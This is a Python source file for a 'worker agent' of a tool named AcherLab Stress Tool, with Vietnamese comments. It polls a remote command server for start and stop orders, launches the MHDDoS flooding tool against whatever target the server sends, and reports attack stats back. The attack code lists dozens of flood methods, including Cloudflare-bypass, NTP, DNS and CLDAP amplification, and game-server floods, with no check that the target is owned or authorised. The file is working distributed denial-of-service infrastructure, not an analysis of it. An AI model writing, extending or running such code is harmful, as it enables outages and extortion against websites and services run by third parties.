#!/usr/bin/env python3
"""
AcherLab Stress Tool - Worker Agent
Chay tren VPS, nhan lenh tu Server (Railway), chay MHDDoS, gui stats ve.
"""

import os, sys, json, time, threading, subprocess, platform, re, requests, signal
from datetime import datetime

SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:5000")
TOKEN = os.environ.get("WORKER_TOKEN", "")
POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "2"))
MHDDOS_DIR = os.environ.get("MHDDOS_DIR", os.path.join(os.path.dirname(__file__), "..", "MHDDoS"))

attack_process = None
attack_start_time = None
stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00", "cpu_per_core": [], "cpu_info": None}
logs = []
prev_cpu = None

def get_cpu_per_core():
    try:
        with open("/proc/stat") as f:
            lines = f.readlines()
        result = []
        for line in lines:
            if line.startswith("cpu") and line[3].isdigit():
                parts = line.split()
                core_id = parts[0][3:]
                user = int(parts[1]); nice = int(parts[2]); sys = int(parts[3]); idle = int(parts[4])
                result.append({"core": core_id, "total": user + nice + sys + idle, "idle": idle})
        return result
    except:
        return []

def get_cpu_usage():
    global prev_cpu
    cur = get_cpu_per_core()
    if not cur:
        return {"overall": 0, "per_core": []}
    if prev_cpu:
        per_core = []
        for c, p in zip(cur, prev_cpu):
            dt = c["total"] - p["total"]
            di = c["idle"] - p["idle"]
            per_core.append({"core": c["core"], "usage": round((1 - di / max(dt, 1)) * 100, 1) if dt > 0 else 0})
        overall = round(sum(x["usage"] for x in per_core) / max(len(per_core), 1), 1)
        prev_cpu = cur
        return {"overall": overall, "per_core": per_core}
    prev_cpu = cur
    return {"overall": 0, "per_core": [{"core": c["core"], "usage": 0} for c in cur]}

def get_system_info():
    try:
        cd = get_cpu_usage()
        mem = "0"
        r = subprocess.run("free -m | awk 'NR==2{printf \"%.1f\", $3*100/$2}'", shell=True, capture_output=True, text=True, timeout=3)
        if r.stdout.strip():
            mem = r.stdout.strip()
        return {"cpu": cd["overall"], "cpu_per_core": cd["per_core"], "memory": float(mem) if mem else 0}
    except:
        return {"cpu": 0, "cpu_per_core": [], "memory": 0}

def get_cpu_info():
    try:
        with open("/proc/cpuinfo") as f:
            text = f.read()
        model = "N/A"
        for line in text.split("\n"):
            if "model name" in line:
                model = line.split(":")[1].strip()
                break
        cores = 0
        for line in text.split("\n"):
            if "cpu cores" in line:
                cores = int(line.split(":")[1].strip())
                break
        count = text.count("processor\t:")
        return {"model": model, "cores": cores or count, "threads": count or 1}
    except:
        return {"model": "Unknown", "cores": 1, "threads": 1}

def parse_mhd_output(line):
    global stats, logs
    logs.append(line.rstrip())
    if len(logs) > 2000:
        logs[:] = logs[-2000:]
    m = re.search(r"Sent:\s*([\d,]+)", line)
    if m:
        stats["requests"] = int(m.group(1).replace(",", ""))
        stats["running"] = True

def monitor_mhd_output(proc):
    global stats
    for line in iter(proc.stdout.readline, ""):
        if not line: break
        parse_mhd_output(line.rstrip())
    proc.wait()
    stats["running"] = False

def run_attack(cmd):
    global attack_process, attack_start_time, stats, logs
    if attack_process and attack_process.poll() is None:
        return {"error": "Already running"}
    target = cmd.get("target", "")
    method = cmd.get("method", "GET")
    threads = str(cmd.get("threads", 100))
    duration = str(cmd.get("duration", 60))
    proxy_type = str(cmd.get("proxy_type", 0))
    rpc = str(cmd.get("rpc", 10))

    logs = []
    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00", "cpu_per_core": [], "cpu_info": None}
    attack_start_time = time.time()

    start_py = os.path.join(MHDDOS_DIR, "start.py")
    if not os.path.exists(start_py):
        logs.append(f"[ERROR] MHDDoS not found at {start_py}")
        return {"error": f"MHDDoS not found at {start_py}"}

    layer7_methods = ["GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW","HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE","XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR"]
    layer4_methods = ["TCP","UDP","SYN","CPS","CONNECTION","VSE","TS3","FIVEM","FIVEM-TOKEN","MINECRAFT","MCBOT","MCPE","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"]

    proc_args = ["python3", "-u", start_py]
    if method in layer7_methods:
        proc_args += [method, target, proxy_type, threads, "http.txt", rpc, duration]
    elif method in layer4_methods:
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname or target
        port = parsed.port or 80
        proc_args += [method, f"{host}:{port}", threads, duration]
    else:
        logs.append(f"[ERROR] Unknown method: {method}")
        return {"error": f"Unknown method: {method}"}

    env = os.environ.copy()
    env["PYTHONWARNINGS"] = "ignore"
    try:
        attack_process = subprocess.Popen(proc_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True, cwd=MHDDOS_DIR, env=env)
        threading.Thread(target=monitor_mhd_output, args=(attack_process,), daemon=True).start()
        logs.append(f"[START] {method} -> {target} | threads={threads} duration={duration}s")
        return {"message": f"Attack started: {method}"}
    except Exception as e:
        logs.append(f"[ERROR] Failed to start: {e}")
        return {"error": str(e)}

def stop_attack():
    global attack_process, stats
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try: attack_process.wait(timeout=5)
        except: attack_process.kill()
        stats["running"] = False
        logs.append("[STOP] Attack stopped by server command")
        return {"message": "Stopped"}
    return {"message": "No attack running"}

def send_headers():
    return {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

def worker_loop():
    global stats, logs
    cpu_info = get_cpu_info()
    print(f"[WORKER] Connected to server: {SERVER_URL}")
    print(f"[WORKER] CPU: {cpu_info['model']} ({cpu_info['cores']}c/{cpu_info['threads']}t)")
    print(f"[WORKER] MHDDoS: {MHDDOS_DIR}")

    while True:
        try:
            r = requests.get(f"{SERVER_URL}/api/worker/command", headers=send_headers(), timeout=10)
            if r.status_code == 200:
                data = r.json()
                cmd = data.get("command")
                if cmd:
                    action = cmd.get("action")
                    if action == "start":
                        result = run_attack(cmd)
                        print(f"[CMD] start -> {result}")
                    elif action == "stop":
                        result = stop_attack()
                        print(f"[CMD] stop -> {result}")

            uptime = "00:00:00"
            if attack_start_time:
                el = int(time.time() - attack_start_time)
                uptime = f"{el//3600:02d}:{(el%3600)//60:02d}:{el%60:02d}"
            stats["uptime"] = uptime

            sys_info = get_system_info()
            stats["cpu"] = sys_info["cpu"]
            stats["memory"] = sys_info["memory"]
            stats["cpu_per_core"] = sys_info["cpu_per_core"]
            stats["cpu_info"] = cpu_info

            recent_logs = logs[-50:] if len(logs) > 0 else []

            payload = {
                "version": "1.0",
                "cpu_info": cpu_info,
                "stats": stats,
                "logs": recent_logs,
            }
            requests.post(f"{SERVER_URL}/api/worker/stats", json=payload, headers=send_headers(), timeout=10)

        except requests.ConnectionError:
            print(f"[WORKER] Cannot reach server. Retrying...")
        except Exception as e:
            print(f"[WORKER] Error: {e}")

        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    if not TOKEN:
        print("[ERROR] WORKER_TOKEN environment variable required")
        sys.exit(1)
    if not SERVER_URL or SERVER_URL == "http://localhost:5000":
        print("[WARN] SERVER_URL not set, using default. Set SERVER_URL env var.")
    print(f"AcherLab Worker Agent starting...")
    worker_loop()
